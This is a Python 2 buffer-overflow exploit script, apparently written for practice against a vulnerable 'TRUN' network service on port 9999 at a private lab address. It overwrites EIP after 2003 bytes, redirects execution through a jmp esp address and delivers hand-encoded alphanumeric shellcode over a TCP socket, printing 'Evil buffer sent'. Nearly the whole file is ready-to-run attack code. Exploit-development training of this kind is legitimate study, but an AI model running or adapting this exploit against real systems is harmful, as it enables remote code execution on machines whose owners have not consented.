#!/usr/bin/python

import socket
import sys


host = "192.168.52.129"
port = 9999

###########################################
## WriTTen by: van6uard
## EIP is overwritten after 2003 bytes.
## Bad Characters '\x00'
## jmp esp  625011bb

shellcode = ""
shellcode += "\x54\x58\x66\x05\12\x02\x50\x5c"      # stack alignment
shellcode += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
shellcode += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
shellcode += "\x05\x73\x50\x50\x50" ## add  eax, 0x50505073
shellcode += "\x05\x63\x40\x40\x40" ## add  eax, 0x40404063
shellcode += "\x50"                 ## push eax
shellcode += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
shellcode += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
shellcode += "\x05\x14\x33\x46\x77" ## add  eax, 0x77463314
shellcode += "\x05\x13\x23\x35\x66" ## add  eax, 0x66352313
shellcode += "\x05\x13\x22\x36\x55" ## add  eax, 0x55362213
shellcode += "\x2D\x33\x33\x33\x33" ## sub  eax, 0x33333333
shellcode += "\x50"                 ## push eax
shellcode += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
shellcode += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
shellcode += "\x05\x31\x30\x67\x75" ## add  eax, 0x75673031
shellcode += "\x05\x21\x20\x57\x75" ## add  eax, 0x75572021
shellcode += "\x50"                 ## push eax
shellcode += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
shellcode += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
shellcode += "\x05\x46\x72\x30\x31" ## add  eax, 0x31307246
shellcode += "\x05\x45\x62\x20\x20" ## add  eax, 0x20206245
shellcode += "\x50"                 ## push eax
shellcode += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
shellcode += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
shellcode += "\x05\x30\x33\x37\x32" ## add  eax, 0x32373330
shellcode += "\x05\x40\x44\x37\x32" ## add  eax, 0x32374440
shellcode += "\x50"                 ## push eax
shellcode += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
shellcode += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
shellcode += "\x05\x46\x66\x30\x34" ## add  eax, 0x34306646
shellcode += "\x05\x45\x66\x20\x34" ## add  eax, 0x34206645
shellcode += "\x50"                 ## push eax
shellcode += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
shellcode += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
shellcode += "\x05\x22\x60\x30\x30" ## add  eax, 0x30306022
shellcode += "\x05\x11\x60\x20\x20" ## add  eax, 0x20206011
shellcode += "\x50"                 ## push eax



buf = ""
buf += "TRUN /.:/"
buf += 'A'*2003
buf += '\xbb\x11\x50\x62'
buf += '\x90'*12
buf += shellcode
buf += 'C'*(3000-2003-4-12-len(shellcode))

try:
    c = socket.socket(socket.AF_INET,socket.SOCK_STREAM) #tcp socket
    c.connect((host, port))
    c.send(buf + '\r\n')
    print "[+] Evil buffer sent"
    c.close()

except:
    print "[-] Can't send evil buffer"
    sys.exit()
